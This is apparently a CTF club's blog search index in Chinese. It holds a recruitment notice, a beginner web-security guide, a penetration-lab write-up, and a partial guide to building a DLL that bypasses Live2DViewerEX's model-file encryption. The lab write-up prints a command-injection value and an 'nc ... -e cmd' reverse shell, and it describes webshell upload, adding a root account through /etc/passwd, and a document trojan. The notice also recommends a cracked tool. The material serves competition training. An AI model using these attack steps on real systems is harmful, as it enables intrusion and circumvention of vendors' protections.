<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>考核须知</title>
      <link href="/posts/0a3e0b83a0aa/"/>
      <url>/posts/0a3e0b83a0aa/</url>
      
        <content type="html"><![CDATA[<h4 id="i-考核的实质："><a href="#i-考核的实质：" class="headerlink" title="i. 考核的实质："></a>i. 考核的实质：</h4><p>考察同学们的自学能力、搜索信息的能力，即使是零基础，也不要气馁，我们会从每周提交的 WriteUp 中看到你的进步与努力！即使最后没有通过，相信你也会从中收获到网络安全意识的提高，自学能力的提升，搜索信息能力的增强！</p><h4 id="ii-考核期间："><a href="#ii-考核期间：" class="headerlink" title="ii. 考核期间："></a>ii. 考核期间：</h4><ol><li>可自由使用百度，GPT 等工具做题，也可在群内自由交流做题心得，也可以对着大佬写的答案（ WriteUp ）边看边做，但是必须是自己动手做出来的题目。因为CTF绝大多数比赛的比赛期间，都是允许选手可以上网边搜索边学，再做出题目。</li><li>合理安排自己的学习时间，并且不管在 DDL 前有无写完题目，都可以交 WP，如果你是0基础小白，也不必担心，只要有一颗热爱网络安全的心，认真学习，WP 中详略得当，有自己独立的思考也是可以通过的，<del>最终解释权归招新人员所有</del>；</li><li>考核内容有限，不用拘泥于等待考核内容发布，按照自己的学习进度往后学，相信你一定会学有所得！</li></ol><h4 id="iii-考核难点："><a href="#iii-考核难点：" class="headerlink" title="iii. 考核难点："></a>iii. 考核难点：</h4><p>考核期间需要安装许多工具，例如 HackBar，BurpSuite（web神器，新手安装起来较为复杂），VMware，IDA（逆向分享工具），Stegsolve（图片隐写解析），御剑（扫描网页后台目录，建议去下破解版），蚁剑（连接后台），还需要利用一系列在线工具，若遇到问题，最好先独立解决，去网上搜安装教程，不断尝试，不过这会耗费你大量时间，如果实在遇到实在无法解决的一些配置问题可以在群里提出（一般网上都有教程(っ °Д °;)っ）；</p><h4 id="iv-关于我们："><a href="#iv-关于我们：" class="headerlink" title="iv. 关于我们："></a>iv. 关于我们：</h4><p>网络空间安全竞赛基地与数计学院 CTF 部本质并非社团，而是技术组织。<strong>网络空间安全竞赛基地</strong>属于网络空间安全学院直属基地，位于青山湖校区，数计学院 CTF 部是网络空间安全竞赛基地的重要合作组织，位于前湖校区，日常成员们会在网络上一起交流技术，学习经验，开展培训。并且基地内有一支今年全校唯一一支打入“长城杯铁人三项赛国赛”决赛的队伍，也是半决赛一等奖。目前由于学校规定，只能有一个社团存在，由于申请时间上的原因，我们将不会衍生社团部门。如果只是对社团感兴趣的同学，想体验社团生活，那建议去烽火。<strong>数计学院 CTF 部</strong>则由指导老师、研究生和本科生共同组成。并且今年有一支队伍为 NCU 打进2024 CISCN 分区赛，夺得荣誉，也有获得复兴杯大学生网络安全精英赛一等奖的选手，蓝桥杯网络安全CTF赛道获奖选手等等，欢迎大家的加入！</p><h4 id="v-考核流程："><a href="#v-考核流程：" class="headerlink" title="v.考核流程："></a>v.考核流程：</h4><p>详见考核流程图。并且以考核流程图为准。</p><p><img src="/../image/%E8%80%83%E6%A0%B8%E9%A1%BB%E7%9F%A5/1%20(2).png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 竞赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络空间安全竞赛基地以及数计CTF部入门</title>
      <link href="/posts/dfad4d07a28f/"/>
      <url>/posts/dfad4d07a28f/</url>
      
        <content type="html"><![CDATA[<p>你好亲爱的学弟学妹：</p><p>​欢迎来到网络空间安全竞赛基地以及 CTF 部，下面我们来介绍一下入门的事情。相信在前面的时候你们遭受过了很多关于看不懂群里在聊什么的困扰。那么我在这里详细介绍一下该怎么学习，怎么入门。</p><p>​首先网络空间安全竞赛基地的主责是对自己进行技术的提升，包括但不限于参加竞赛，参加企业培训，考证，参加实际项目，以及最重要的自己专研与相互交流学习。</p><p>提前声明：这些方面和学校平常上课以及培养方案算是过于超前了。你需要平衡好学习与竞赛。当然也可以选择和老登一样不管学习，直接面向就业(也能获得不错的岗位)</p><h1 id="入门："><a href="#入门：" class="headerlink" title="入门："></a>入门：</h1><p>首先需要学习的基本内容：</p><h3 id="1-如何擅用网络，包括搜索，提问，魔法梯子，论坛"><a href="#1-如何擅用网络，包括搜索，提问，魔法梯子，论坛" class="headerlink" title="1.如何擅用网络，包括搜索，提问，魔法梯子，论坛"></a>1.如何擅用网络，包括搜索，提问，魔法梯子，论坛</h3><p>搜索：使用 Google，不会可以问 Copilot ，由于 Copilot 是联网的，所以你能通过它翻到一些资料，进资料里面查看，注意辨别内容真伪。</p><p>向他人提问：<a href="https://lug.ustc.edu.cn/wiki/doc/smart-questions/">https://lug.ustc.edu.cn/wiki/doc/smart-questions/</a></p><p>梯子：找人进行领取</p><p>论坛：包括但不限于<a href="https://bbs.kanxue.com/">https://bbs.kanxue.com/</a></p><h3 id="2-如何学习竞赛内容"><a href="#2-如何学习竞赛内容" class="headerlink" title="2.如何学习竞赛内容"></a>2.如何学习竞赛内容</h3><p>好的，当你看到这里的时候，如果你是想加入我们并且现在在群里面，那么后面几条你可以先不看或者选看。你现在的目标是完成考核</p><p>首先你需要去看<a href="https://hello-ctf.com/HC_Start/">https://hello-CTF.com/HC_Start/</a></p><p>了解 CTF 大概是干什么的,其次看下面对应方向使用的工具，进行尝试安装，在安装方面无论有什么问题，都可以问！就是怕你不问，不过在问之前，建议自己先动手实操一遍。</p><p>简单的描述在 Hello-CTF，CTFWiki 等都有介绍，具体体验如何需要自行刷题验证</p><p>Web ：范围广，无论是知识要求还是就业或是折磨，好玩</p><p>Crypto：算法，对加解密要求会多一些，写解密算法</p><p>Reverse：研究操作系统底层架构，反向还原程序执行逻辑</p><p>Pwn：深入，非常深入的一门学问，通过栈溢出等手段攻破服务，操控电脑</p><p>Misc：好玩。轻松愉快得入门，泥牛入海的进步，但对就业当安全运营看流量有帮助的。</p><p>然后是漫长的刷题，BuuCTF、NssCTF、Bugku、攻防世界、CTFshow、CTFhub、EDISEC 等等</p><p>目前招新阶段推荐是CTF各个方向都去了解，知道其是干什么的。后面的学习我们是会根据各位来选择某一方面或者几方面进行深入学习</p><p><strong>在初学的时候，不会做题很正常，主要是讲题目思路的积累为主。</strong></p><h3 id="3-安全意识"><a href="#3-安全意识" class="headerlink" title="3.安全意识"></a>3.安全意识</h3><p>不希望有人仍然使用生日号码当密码，参考<a href="https://evilcos.me/yinsi.html">https://evilcos.me/yinsi.html</a></p><p>新时代的安全需更甚</p><h3 id="4-学会使用-Markdown-格式书写"><a href="#4-学会使用-Markdown-格式书写" class="headerlink" title="4.学会使用 Markdown 格式书写"></a>4.学会使用 Markdown 格式书写</h3><p>使用 Typora 练习，或者其他支持 Markdown 语法的文档工具，比如语雀、飞书</p><h3 id="5-使用-Linux-机器，如-Kali、Ubuntu，安装-VMware-然后装-Kali-的虚拟机"><a href="#5-使用-Linux-机器，如-Kali、Ubuntu，安装-VMware-然后装-Kali-的虚拟机" class="headerlink" title="5.使用 Linux 机器，如  Kali、Ubuntu，安装 VMware 然后装 Kali 的虚拟机"></a>5.使用 Linux 机器，如  Kali、Ubuntu，安装 VMware 然后装 Kali 的虚拟机</h3><p>学习使用 Linux，在网上下载 VMware 、安装 Kali ，具体安装步骤网上都有，练习基本的 Linux 命令</p><h3 id="6-使用浏览器插件"><a href="#6-使用浏览器插件" class="headerlink" title="6.使用浏览器插件"></a>6.使用浏览器插件</h3><p>比如 HackBar 、沉浸式翻译、 SwitchOmega</p><h3 id="7-了解从输入-URL-到页面加载完成过程中都发生了什么事情，网页编码"><a href="#7-了解从输入-URL-到页面加载完成过程中都发生了什么事情，网页编码" class="headerlink" title="7.了解从输入 URL 到页面加载完成过程中都发生了什么事情，网页编码"></a>7.了解从输入 URL 到页面加载完成过程中都发生了什么事情，网页编码</h3><p><a href="https://blog.csdn.net/qq_43650490/article/details/119463103">https://blog.csdn.net/qq_43650490/article/details/119463103</a></p><p><a href="https://www.qianxingzhem.com/post-1499.html">https://www.qianxingzhem.com/post-1499.html</a></p><h3 id="8-熟悉网络配置并知道网络问题如何解决，Windows-Linux环境下动态IP获取与静态IP配置，DNS配置"><a href="#8-熟悉网络配置并知道网络问题如何解决，Windows-Linux环境下动态IP获取与静态IP配置，DNS配置" class="headerlink" title="8.熟悉网络配置并知道网络问题如何解决，Windows&#x2F;Linux环境下动态IP获取与静态IP配置，DNS配置"></a>8.熟悉网络配置并知道网络问题如何解决，Windows&#x2F;Linux环境下动态IP获取与静态IP配置，DNS配置</h3><p>安装完 Kalli 之后可以尝试练习</p><h3 id="9-学会更合理地安排时间和任务"><a href="#9-学会更合理地安排时间和任务" class="headerlink" title="9.学会更合理地安排时间和任务"></a>9.学会更合理地安排时间和任务</h3><h3 id="10-创建-GitHub-账号、创建自己的博客"><a href="#10-创建-GitHub-账号、创建自己的博客" class="headerlink" title="10.创建 GitHub 账号、创建自己的博客"></a>10.创建 GitHub 账号、创建自己的博客</h3><p>通过梯子创建 GitHub 账号，通过 Hexo 、Butterfly 组合搭建个人博客，托管到GitHub平台上</p><h3 id="11-一定一定创建自己的知识库"><a href="#11-一定一定创建自己的知识库" class="headerlink" title="11.一定一定创建自己的知识库"></a>11.一定一定创建自己的知识库</h3><p> 一定一定要</p><p>以上皆为入门建议，作为学习参考</p><p>另外我本想放在考核须知里的东西</p><p>加入我们的功利性好处: CTF 比赛拿的奖一样可以申请到第二课堂学分，综素分等等。甚至可以加入别的安全团队发起的联合战队，与全国各地的 CTFers 交流，与真正高手们一起学习。同时帮老师一起处理问题，混混眼熟，加加分。磨练自己技术上的同时，对保研以及就业都有好处，以及优秀学长在企业或者学院的资源。这些不是单从学校就可以获取的东西，也不是凭空出现的。都是我们前面的学长一代一代努力争取来的，期待你的到来( •̀ ω •́ )✧。(虽然功利地学不好，但还是放出来吸引更多的人吧)::&gt;_&lt;::</p><h2 id="附加数计CTF部郭少东学长的web速学指南"><a href="#附加数计CTF部郭少东学长的web速学指南" class="headerlink" title="附加数计CTF部郭少东学长的web速学指南"></a>附加数计CTF部郭少东学长的web速学指南</h2><h3 id="15天web速学指南"><a href="#15天web速学指南" class="headerlink" title="15天web速学指南"></a>15天web速学指南</h3><p>[TOC]</p><h2 id="1-5天：以最快的速度了解多门语言"><a href="#1-5天：以最快的速度了解多门语言" class="headerlink" title="1-5天：以最快的速度了解多门语言"></a>1-5天：以最快的速度了解多门语言</h2><h3 id="第一天："><a href="#第一天：" class="headerlink" title="第一天："></a>第一天：</h3><p>通过 W3School 以最快速度入门 HTML ，CSS 和 Javascript 语言。</p><p><a href="http://www.w3school.com.cn/">学习地址</a></p><p>建议：在本地写同样的代码并查看结果是否和教程的结果相同。</p><h3 id="第二-四天："><a href="#第二-四天：" class="headerlink" title="第二~四天："></a>第二~四天：</h3><p>下载并安装 PhpStudy。</p><p>通过 W3School 以最快速度入门 PHP ，并在本地复现每一个教程中的代码，强调：不要复制网页中的代码，要自己手打。如果出现的结果和网页中的结果相同，则继续学习。</p><p><a href="http://www.w3school.com.cn/php/index.asp">继续学习</a></p><p>如果有些语句无法理解其含义，那就无脑抄一遍并执行，看到结果即可。请自行安排学习时间，调整学习效率，以至于在第四天的时候可以将 PW3School PHP 部分的“PHP数据库”学习完。</p><h3 id="第五天："><a href="#第五天：" class="headerlink" title="第五天："></a>第五天：</h3><p>通过 W3School 学习 SQL 语言，了解 select&#x2F;insert&#x2F;update&#x2F;delete ，以及 union select 的语法。</p><p>本地执行SQL语言的方法如下：</p><p>1.PhpStudy 开启，保证 MySQL 是开启状态。</p><p>2.进入 PhpStudy 安装目录 &#x2F;MySQL&#x2F;bin</p><p>3.在此处打开命令与提示符，或在其他地方打开 cd 到此处，输入mysql.exe -u root -proot，回车</p><p>4.输入 create database tuzishifuzhuishuaile; （注意句末有分号）并回车</p><p>5.输入 use tuzishifuzhuishuaile;  并回车</p><p>6-7天：SQL注入学习</p><h3 id="第六天："><a href="#第六天：" class="headerlink" title="第六天："></a>第六天：</h3><p>既然学会了 SQL语句，那就动手做一下 SQL注入 题目吧！但是做之前，除了知道 PHP 和 SQL语言以外，还需要知道 SQL注入是什么，怎么注入。</p><h3 id="第七天："><a href="#第七天：" class="headerlink" title="第七天："></a>第七天：</h3><p>我猜你可能会用一整天时间看SQL注入的视频教程，虽然短，但是你需要在本地自己操作一下。我觉得一天还是需要的。如果你可以在几个小时内搞定，那你肯定没有完全吸收。除非你是个学霸XD。</p><p>8天：各种工具的使用</p><h3 id="第八天："><a href="#第八天：" class="headerlink" title="第八天："></a>第八天：</h3><p>之后就需要一些工具啦，我这里推荐一些工具供你学习：</p><ol><li><p>Python：请安装好。并将python加入到环境变量中，以至于在随处打开命令与提示符窗口输入python 都可以打开 Python，方法自行百度。</p></li><li><p>HackBar：这是一个 Firefox 浏览器的插件，对于修改 GET 和 POST 请求，用这个插件非常的方便，而且这个插件可以解码一些编码，比如 URL 编码， Base64 编码。（如果你并不知道上面提到的名词是什么，请百度学习一下）</p></li><li><p>BurpSuite：这是在做 Web 题目最最常用到的工具，工具的详细使用说明可以</p><p><a href="https://t0data.gitbooks.io/burpsuite/content/chapter3.html">点击查看</a></p></li></ol><p>为了做 Web 题目，只需要学习到第三章“数据拦截与控制”就可以了。</p><h3 id="9天：学习各种概念"><a href="#9天：学习各种概念" class="headerlink" title="9天：学习各种概念"></a>9天：学习各种概念</h3><p>第九天到了为什么还没有开始继续做题呢？是因为还有一些概念不懂就没法做题。</p><p>那么下面给出一个你需要了解的概念的列表，你需要自己去百度查询到底这些是什么，这样下次别人滔滔不绝的时候起码能听懂他在说什么。如果你有精力，最好可以深入的学习一些这些东西，并自己实践一下。</p><p>1.URL 编码</p><p>2.HTML 编码</p><p>3.Base64 编码</p><p>4.数据包</p><p>5.HTTP 响应头，都有哪些，都是做什么的</p><p>6.GET 传参，POST 传参，怎么传参</p><p>7.HTTP 协议是什么</p><p>8.MD5 是什么</p><p>9.GitHub</p><p>10.WriteUp</p><p>11.WebShell</p><p>——以上是非安全概念，下面是安全概念—–</p><p>12.信息泄露&#x2F;源码泄露</p><p>13.暴力破解</p><p>14.SQL 注入</p><p>15.XSS</p><p>16.CSRF</p><p>17.远程命令执行</p><p>18.代码执行</p><p>19.文件包含</p><p>20.任意文件上传&#x2F;下载&#x2F;删除</p><p>21.逻辑漏洞</p><p> ——如果你心有余力，还可以了解一下下面的概念——</p><ol start="22"><li>XXE</li></ol><p>23.SSRF</p><p>24.序列化漏洞&#x2F;反序列化漏洞</p><p>25.变量覆盖</p><p>26.DDOS</p><p>27.CRLF</p><p>28.DNS协议</p><p>29.Apache&#x2F;IIS&#x2F;Tomcat&#x2F;Nginx</p><p>是不是很吓人！这么长！别担心，这些都是一些概念，只需要你知道这是啥东西就可以了，而且从11下面的内容，即使你并不了解也没关系，因为后面也会学习到。</p><h3 id="10-15-天：各种web安全漏洞"><a href="#10-15-天：各种web安全漏洞" class="headerlink" title="10-15 天：各种web安全漏洞"></a>10-15 天：各种web安全漏洞</h3><p>第10-15天</p><p>你终于弄明白了一大堆概念究竟是什么，现在终于可以开始学习安全漏洞，利用了！那么10到15天就是学习这些知识的时候了。</p><p>提示：所有的漏洞请务必在本地复现</p><p>1.SQL注入漏洞：sql-lab</p><p>2.文件包含：</p><p><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html">点击此处</a></p><p>3.逻辑漏洞：php 是弱语言，要注意常见的用于判断的函数：</p><p><a href="http://www.blueshoes.org/en/developer/php_cheat_sheet">判断函数</a></p><p>4.变量覆盖与代码执行</p><p>暂无</p><p>5.代码审计：PHP-Audit-Labs</p><p>6.xss漏洞：xss-lab</p><p>7.csrf：</p><p><a href="http://wooyun.jozxing.cc/static/drops/web-15556.html">点击学习</a></p><p>好吧，我承认上面可能要求太高了，五天大概率做不完。但如果你真的这么坚持下去了，相信我，你在新选手中肯定是TOP3</p><hr><p><del>从此踏上CTF的不归路</del></p><blockquote><p>郭少东</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 竞赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次渗透题目回顾</title>
      <link href="/posts/b14b406e218d/"/>
      <url>/posts/b14b406e218d/</url>
      
        <content type="html"><![CDATA[<p>首先这次是第一届长城杯决赛的企业环境题目回顾，很多地方都是值得小白一看的，这里做详细介绍。由于我并没有存相关图片，这里展示的图片都将是借用别人的图片</p><h1 id="开打！"><a href="#开打！" class="headerlink" title="开打！"></a>开打！</h1><h2 id="第一层环境"><a href="#第一层环境" class="headerlink" title="第一层环境"></a>第一层环境</h2><p>由题目环境得知现在又三个靶机，分别是</p><p>202.0.2.29</p><p>202.0.2.30</p><p>202.0.2.32</p><h3 id="第一台机子"><a href="#第一台机子" class="headerlink" title="第一台机子"></a>第一台机子</h3><p>首先使用nmap对ip进行扫描，</p><p><img src="/posts/b14b406e218d/image-20240811170831217.png" alt="image-20240811170831217"></p><p>发现开了80，22，8080端口，首先我们可以去看它的web服务，发现是</p><p><img src="/posts/b14b406e218d/image-20240811170934738.png" alt="image-20240811170934738"></p><p>此外就没有什么发现了，这时候我们就可以去考虑目录扫描</p><p><img src="/image-20240811171025117.png" alt="image-20240811171025117"></p><p>你会发现有一个uploads，这个时候就需要警觉，可能这个就是漏洞点，虽然后面的状态码显示的是301，但是不妨碍我们查看一下</p><p><img src="/posts/b14b406e218d/image-20240811171406751.png" alt="image-20240811171406751"></p><p>发现上传点，上传木马即可</p><p><img src="/posts/b14b406e218d/image-20240811173154656.png" alt="image-20240811173154656"></p><p><img src="/posts/b14b406e218d/image-20240811173216411.png" alt="image-20240811173216411"></p><p>通过翻找文件找到flag</p><p>但是发现有一个flag文件没有权限访问，同时还有一个文件叫做password-reminder.txt</p><p><img src="/posts/b14b406e218d/image-20240811173453203.png" alt="image-20240811173453203"></p><p><img src="/posts/b14b406e218d/image-20240811173505565.png" alt="image-20240811173505565"></p><p>猜测为ssh密码，因为上面开了ssh服务，此时我们就通过爆破手段，无论是写脚本，或者是使用超级弱口令检查工具或者是九头蛇爆破，最后使用密码登录到靶机上。</p><p>现在的权限基本够了，但还不是root，进入home目录能看到一个生成cookie的脚本</p><p><img src="/posts/b14b406e218d/image-20240811173820107.png" alt="image-20240811173820107"></p><p><img src="/posts/b14b406e218d/image-20240811174109978.png" alt="image-20240811174109978"></p><p>但是存在安全问题，因为使用sudo -l 查看权限会发现python是root权限，而且这个python脚本有命令执行漏洞，那么我们可以通过sudo python 此脚本来进行执行root命令进行提权</p><p>可以通过root权限增加root权限用户，再用这个用户进行ssh连接，这样我们就不用每次都使用这个python脚本执行命令了</p><p>一般到提权为root就没有东西了，你可以选择通过内网穿透，然后再查看此机器的内网是不是还有其他机器，或者查看此机器的路由 route -n或netstat -a，没有东西就可以撤了</p><p>但其实这个机器是能翻到还有一个内网环境的，此时我们已经有了root权限，而且木马也连上了，那么我们可以考虑使用venom或者proxychains进行内网穿透。</p><p>穿透好后，我们通过提示，有人曾在另一个内网使用ssh访问过这台机子，那么我们可以查看ssh的auth.log文件</p><p>根据提示的auth.log中翻到的ip地址，设置msf的代理环境，如果是在windows上使用venom则不需要</p><p>扫描能得到三台内网机子</p><p><img src="/posts/b14b406e218d/image-20240811180700320.png" alt="image-20240811180700320"></p><h4 id="第一台机子的第二层环境"><a href="#第一台机子的第二层环境" class="headerlink" title="第一台机子的第二层环境"></a>第一台机子的第二层环境</h4><p>172.25.0.2 ，172.25.0.7 ，172.25.0.100</p><h4 id="内网一，机一"><a href="#内网一，机一" class="headerlink" title="内网一，机一"></a>内网一，机一</h4><p>172.25.0.2</p><p>访问即可</p><p><img src="/posts/b14b406e218d/image-20240811183206785.png" alt="image-20240811183206785"></p><p>配合bp进行抓包，通过yt_url修改命令进行命令执行</p><p>yt_url&#x3D;ll|ls${IFS}-al</p><p>同时发现能使用wget命令下载到本地的第一层靶机的文件，那么就可以通过这个下载我们的木马，访问即可</p><p><img src="/posts/b14b406e218d/image-20240811183557305.png" alt="image-20240811183557305"></p><p>但是很明显能看到权限不够，那么我们可以查看进程和进程权限</p><p>上 pspy 检测进程 <a href="https://github.com/DominicBreuker/pspy/releases">https://github.com/DominicBreuker/pspy/releases</a></p><p>看到root执行了clean.sh，并且www-data用户对该文件有读写权力</p><p><img src="/posts/b14b406e218d/image-20240811183753491.png" alt="image-20240811183753491"></p><p><img src="/posts/b14b406e218d/image-20240811183809740.png" alt="image-20240811183809740"></p><p>然后进行访问<img src="/posts/b14b406e218d/image-20240811184614764.png" alt="image-20240811184614764"></p><p>查看系统环境信息</p><p><img src="/posts/b14b406e218d/image-20240811184639739.png" alt="image-20240811184639739"></p><p>能知道账号密码，听说直接进入数据库能查看到flag</p><p>同时，能发现其下面还有内网，第二层内网</p><h5 id="内网二"><a href="#内网二" class="headerlink" title="内网二"></a>内网二</h5><p>192.168.200.116</p><p>通过相同的代理手段，进入172，然后访问下面的192.168.100.116</p><h6 id="内网二，机一"><a href="#内网二，机一" class="headerlink" title="内网二，机一"></a>内网二，机一</h6><p>访问第二个内网二的机器</p><h4 id="内网一，机三"><a href="#内网一，机三" class="headerlink" title="内网一，机三"></a>内网一，机三</h4><p>能发现一个新的samba服务，ip地址为172.25.0.100</p><p><img src="/posts/b14b406e218d/image-20240811190410518.png" alt="image-20240811190410518"></p><p><img src="/posts/b14b406e218d/image-20240811190420136.png" alt="image-20240811190420136"></p><p>使用samba历史漏洞打</p><p><img src="/posts/b14b406e218d/image-20240811190501869.png" alt="image-20240811190501869"></p><p><img src="/posts/b14b406e218d/image-20240811190518361.png" alt="image-20240811190518361"></p><p>查找内网能查到192.168.1.2</p><h6 id="机三内网二"><a href="#机三内网二" class="headerlink" title="机三内网二"></a>机三内网二</h6><p><img src="/posts/b14b406e218d/image-20240811190701089.png" alt="image-20240811190701089"></p><p>使用office的cve-2017-11882漏洞</p><p><img src="/posts/b14b406e218d/image-20240811190747515.png" alt="image-20240811190747515"></p><p>生成doc文件木马进行上传，赛方说后台模拟了一个机器人进行点击，我们上传木马，机器人会自动点击doc文件木马，我们就可以进行访问了</p><p><img src="/posts/b14b406e218d/image-20240811190931592.png" alt="image-20240811190931592"></p><p>到达此处后，访问文件依旧会发现权限不够，需要system权限</p><p>我们通过ms15-077漏洞提权到system，再去读flag</p><p>使用nc 192.168.3.34 1234 -e cmd尝试弹回shell</p><p>然后去磁盘里翻flag即可</p><h3 id="机二"><a href="#机二" class="headerlink" title="机二"></a>机二</h3><p>接下来是第二个机器</p><p>首先也是进行扫描</p><p><img src="/posts/b14b406e218d/image-20240811175025721.png" alt="image-20240811175025721"></p><p>发现ssh、web、mysql服务</p><p>猜测也是要提权的</p><p>首先也先访问80的web服务</p><p><img src="/posts/b14b406e218d/image-20240811175128792.png" alt="image-20240811175128792"></p><p>有上传点，直接无脑上传，其次有文件，打开文件并进行拖拽能看到flag</p><p><img src="/posts/b14b406e218d/image-20240811175212675.png" alt="image-20240811175212675"></p><p>使用蚁剑连接即可，翻找flag文件</p><p>然后猜测提权，查看到&#x2F;etc&#x2F;passwd文件有写入权限</p><p>我们直接写入root权限账号，然后连接即可，会在root目录下发现几个flag</p><p>提权后，再查看其内网，发现没有机器存活，那么可以退出下一个了</p><p>第三台机器</p><p>也是进行扫描</p><p><img src="/posts/b14b406e218d/image-20240811175512214.png" alt="image-20240811175512214"></p><p>发现没有开80端口</p><p>访问其8899端口会发现一个程序，这里是需要通过pwn来解决这个问题</p><p><img src="/posts/b14b406e218d/image-20240811175620696.png" alt="image-20240811175620696"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对Live2DViewerEX生成可用mono-2.0-bdwgc.dll的尝试</title>
      <link href="/posts/4748fe5d0a70/"/>
      <url>/posts/4748fe5d0a70/</url>
      
        <content type="html"><![CDATA[<p>首先我也是创建完这个blog的看板娘后发现的live2DviewerEX，突发奇想能不能将Live2DViewerEX里面的看板娘导出来，结果发现格式不一样，这里是被加密过的，于是乎就开始在网上搜索解密。在我实现过程中，网上生成mono-2.0-bdwgc.dll对我这种对于vs和dnspy不熟悉的用户有些不友好，然后下面就是我写一份比较完善的指南</p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>首先可以看看Live2DViewerEX文件到底长什么样子</p><p>这里原本有三份文件</p><p><img src="https://i.postimg.cc/5N1VtyGY/1.png" alt="img"></p><p>这里的lpk文件后缀可以用zip格式打开，然后解压出来是一些bin3&#x2F;bin文件，里面包含了模型的参数配置，这里是被加密过的，而我们需要的是没被加密过的moc3&#x2F;moc文件，原理上来说，应该是Live2DViewerEX在接受了这些bin后会将其生成为moc3&#x2F;moc。</p><p>厂商会通过给mono-2.0-bdwgc.dll再做加密让我们没法直接破解它的一些逻辑，但其实我们可以自己生成一份没有加密过的mono-2.0-bdwgc.dll，来绕过厂商的限制，在Live2DViewerEX层拿到我们需要的moc文件。可以尝试hook劫持或者破译加密。网上的方法一般是破解加密，但是因为我太菜了，只做到了生成mono-2.0-bdwgc.dll，后面的我也没做。</p><p>另外提一嘴，在解压出来的文件中你可以看到两个没有后缀的文件，其实比较大的那个是模型的图的文件，另一个是模型的json配置文件，如下图</p><p><img src="https://i.postimg.cc/sxrt1Hnd/2.png" alt="img"></p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>然后我们着手去生成mono-2.0-bdwgc.dll文件</p><p>首先使用git下载官方的mono库和另一个工具库dnSpy-Unity-mono</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Unity-Technologies/mono</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/dnSpy/dnSpy-Unity-mono</span><br></pre></td></tr></table></figure><p>对于<strong>master分支和dnSpy两个分支</strong>的问题，其实使用git clone 的时候已经拉下来了，只需要进去后使用git checkout切换即可。(如果这里看不懂的话，建议得去搜一下git怎么使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout dnSpy</span><br></pre></td></tr></table></figure><p><img src="https://i.postimg.cc/hGHFRtTG/3.png" alt="img"></p><p>先去下载一个.NET SDK</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载地址：https://dotnet.microsoft.com/zh-cn/download</span><br></pre></td></tr></table></figure><p>然后我们打开vs，注意不是vscode，vscode对sln生成不太好。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载网址：https://visualstudio.microsoft.com/zh-hans/vs/</span><br></pre></td></tr></table></figure><p>首先在上面clone的dnspy-unity-mono中找到umpatcher.sln，使用vs打开</p><p><img src="https://i.postimg.cc/zBWszYFF/4.png" alt="img"></p><p>我用的是上面文件夹里面的那个umpatcher.sln，不知道这个对生成有没有关系。在这里右键选择用vs打开然后双击umpatcher.sln也行</p><p><img src="https://i.postimg.cc/5ySDz5GH/5.png" alt="img"></p><p>这里点击生成就行</p><p>然后你就能在类似于这样的地址中找到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xxxxx\dnSpy-Unity-mono\src\umpatcher\umpatcher\obj\Release\net48</span><br></pre></td></tr></table></figure><p>但我建议使用everything找。</p><p>查看当前的mono版本和生成时间</p><p>找到Live2DViewerEX本地文件下的lw.exe，查看版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\steam\steamapps\common\Live2DViewerEX\bin\lw</span><br></pre></td></tr></table></figure><p><img src="https://i.postimg.cc/gcVC1dJY/6.png" alt="image-20240718090921607"></p><p>那么它的小版本就是2019.4.40，它的大版本是unity-2019.4-mbe</p><p>可以在github中搜到</p><p><img src="https://i.postimg.cc/HL8Kz1R1/7.png" alt="image-20240718091211386"></p><p>打开本地的git，打开mono，使用git checkout 生成&#x2F;切换到这个mbe</p><p><img src="https://i.postimg.cc/gkGCW5X3/8.png" alt="image-20240718091433919"></p><p>然后在这里输入gitk，打开一个新的应用界面，然后在这里翻，找到你的小版本，然后点击即可</p><p><img src="https://i.postimg.cc/sXFL00CQ/9.png" alt="image-20240718091605025"></p><p>点击之后跳转出的这个玩意就是你的commit hash，记录下你的commit hash</p><p><img src="https://i.postimg.cc/dtBKZvPW/10.png" alt="image-20240718091702751"></p><p>下载一个dnspy做为文件分析器，它本来就是用于二进制逆向的一款工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/dnSpy/dnSpy/releases</span><br><span class="line">或者</span><br><span class="line">https://blog.csdn.net/aeaxea43/article/details/108632786</span><br></pre></td></tr></table></figure><p>如果dnspy提示需要下什么，就下。</p><p>然后使用dnspy打开steam下的mono-2.0-bdwgc.dll，类似于下面这个地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\steam\steamapps\common\Live2DViewerEX\bin\lw\MonoBleedingEdge\EmbedRuntime</span><br></pre></td></tr></table></figure><p>然后你就能看到时间戳类似于这样，但下面这个是我新生成的。 记一下你的生成时间，比如我这里是2024&#x2F;7&#x2F;18</p><p><img src="https://i.postimg.cc/ry5Tcxh2/11.png" 